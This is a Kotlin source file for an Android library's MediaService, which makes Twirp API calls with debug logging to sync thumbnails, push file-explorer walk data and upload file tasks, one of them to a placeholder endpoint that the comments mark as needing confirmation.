package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.*
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.apiCall
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity // Import PushFileTaskEntity
import android.util.Log // Added for logging

/**
 * Implementation of MediaService
 */
class MediaServiceImpl : MediaService {
    private companion object { // Companion object for TAG
        private const val TAG = "MediaServiceImplLogs"
    }

    init {
        Log.d(TAG, "[DEBUG] MediaServiceImpl instance created.")
    }

    /**
     * Get pending thumbnails from the server
     *
     * @return The response containing pending thumbnails
     */
    override suspend fun getPendingThumbnails(): ApiResponse<GetPendingThumbnailsResponse> {
        Log.d(TAG, "[DEBUG] getPendingThumbnails called.")
        val endpoint = "explorer.FileExplorer/GetPendingThumbnails"
        val request = Empty()
        Log.d(TAG, "[DEBUG] getPendingThumbnails: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        val response = apiCall<Empty, GetPendingThumbnailsResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] getPendingThumbnails: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push file explorer walk data to the server
     *
     * @param request The file explorer walk data to push
     * @return The response from the server
     */
    override suspend fun pushFileExplorerWalk(request: PushFileExplorerWalkRequest): ApiResponse<PushFileExplorerWalkResponse> {
        Log.d(TAG, "[DEBUG] pushFileExplorerWalk called. Request: $request")
        val endpoint = "explorer.FileExplorer/PushFileExplorerWalk"
        Log.d(TAG, "[DEBUG] pushFileExplorerWalk: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        val response = apiCall<PushFileExplorerWalkRequest, PushFileExplorerWalkResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushFileExplorerWalk: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push file explorer walk data to the server (V2)
     *
     * @param request The file explorer walk data to push
     * @return The response from the server
     */
    override suspend fun pushFileExplorerWalkV2(request: PushFileExplorerWalkV2Request): ApiResponse<PushFileExplorerWalkV2Response> {
        Log.d(TAG, "[DEBUG] pushFileExplorerWalkV2 called. Request: $request")
        val endpoint = "explorer.FileExplorer/PushFileExplorerWalkV2"
        Log.d(TAG, "[DEBUG] pushFileExplorerWalkV2: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        val response = apiCall<PushFileExplorerWalkV2Request, PushFileExplorerWalkV2Response>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushFileExplorerWalkV2: apiCall returned. Response: $response")
        return response
    }

    /**
     * Sync thumbnails with the server
     *
     * @return The response from the server
     */
    override suspend fun syncThumbnails(): ApiResponse<SyncThumbnailsResponse> {
        Log.d(TAG, "[DEBUG] syncThumbnails called.")
        val endpoint = "explorer.FileExplorer/SyncThumbnails"
        val request = Empty()
        Log.d(TAG, "[DEBUG] syncThumbnails: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        val response = apiCall<Empty, SyncThumbnailsResponse>(
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] syncThumbnails: apiCall returned. Response: $response")
        return response
    }

    /**
     * Push a file upload task to the server.
     * This is the missing implementation for the `pushFile` method from MediaService.
     *
     * IMPORTANT: You need to confirm the correct Twirp endpoint for pushing PushFileTaskEntity.
     * I've used a placeholder endpoint "media.MediaService/PushFile" and assumed an Empty response.
     * Adjust `endpoint` and `Res` type (`Empty` or another appropriate response model if your API returns one)
     * based on your backend's API definition for file uploads.
     *
     * @param request The file task entity to push.
     * @return An ApiResponse indicating success, error, or in-progress status.
     */
    override suspend fun pushFile(request: PushFileTaskEntity): ApiResponse<Unit> {
        Log.d(TAG, "[DEBUG] pushFile called. Request: $request")
        // You will need to determine the correct Twirp endpoint for pushFile.
        // For example, if it's part of a 'media' service and is called 'PushFile'.
        // The request type will be PushFileTaskEntity.
        // The response type is Unit, meaning no specific data is returned on success.
        val endpoint = "media.MediaService/PushFile" // <<-- VERIFY THIS ENDPOINT WITH YOUR BACKEND API DOCS
        Log.d(TAG, "[DEBUG] pushFile: Calling apiCall with endpoint: \"$endpoint\", req: $request")
        val response = apiCall<PushFileTaskEntity, Unit>( // Request type is PushFileTaskEntity, response type is Unit
            endpoint = endpoint,
            req = request
        )
        Log.d(TAG, "[DEBUG] pushFile: apiCall returned. Response: $response")
        return response
    }
}

